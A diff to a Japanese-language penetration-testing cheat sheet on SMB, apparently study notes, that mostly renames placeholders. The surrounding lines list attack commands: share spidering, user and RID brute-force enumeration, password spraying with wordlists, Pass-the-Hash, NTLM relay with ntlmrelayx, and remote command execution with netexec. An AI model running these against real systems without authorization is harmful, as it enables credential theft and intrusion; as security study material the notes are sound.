@@ -310,7 +310,7 @@ smb:> mget *
 基本コマンド
 ```zsh
 mkdir <mount_dir>
-sudo mount -t cifs //<target_IP>/<share_name> <mound_dir>/ -o username=<username>,password=<pw>
+sudo mount -t cifs //<target_IP>/<share_name> <mound_dir>/ -o username=<username>,password=<password>
 cd <mount_dir>
 # マウント解除：sudo umount -l <mount_dir>
 ```
@@ -332,14 +332,15 @@ netexec smb <target_IP> -u <username> -p '<password>' -M spider_plus
 
 ---
 
+- [ ] todo: 以降編集
 ## ユーザーの列挙
 
-- enum4linuxでも
+- enum4linuxでも列挙可能
 - 💡AD環境ではアカウントロックに強いkerbruteの方がよい
 
 ユーザー一覧の取得
 ```zsh
-netexec smb <target_IP> -u <username> -p '<PW>' --users
+netexec smb <target_IP> -u <username> -p '<password>' --users
 ```
 
 ユーザーのブルートフォース([用語](../../Misc/用語.md#RID%20(Relative%20Identifier)))
@@ -349,7 +350,7 @@ netexec smb <target_IP> -u guest -p '' --rid-brute
 
 入手済み認証情報の有効性確認
 ```zsh
-netexec smb <target_IP> -u <username wordlist> -p <pw wordlist> --continue-on-success
+netexec smb <target_IP> -u <username wordlist> -p <password wordlist> --continue-on-success
 ```
 
 ---
@@ -391,7 +392,7 @@ smb: > put <local> <remote>
 | ------------- | --------------------- | ------------------------------------------------- |
 | Pass-the-Hash | NetExec               | `netexec smb <target_IP> -u <username> -H <NTLM>`   |
 | SMB Relay     | Impacket (ntlmrelayx) | `impacket-ntlmrelayx -tf <targets.txt>`           |
-| 任意コマンド実行      | NetExec / Impacket    | `nxc smb <target_IP> -u <user> -p <pw> -x 'whoami'` |
+| 任意コマンド実行      | NetExec / Impacket    | `nxc smb <target_IP> -u <user> -p <password> -x 'whoami'` |
 
 ---
 ---
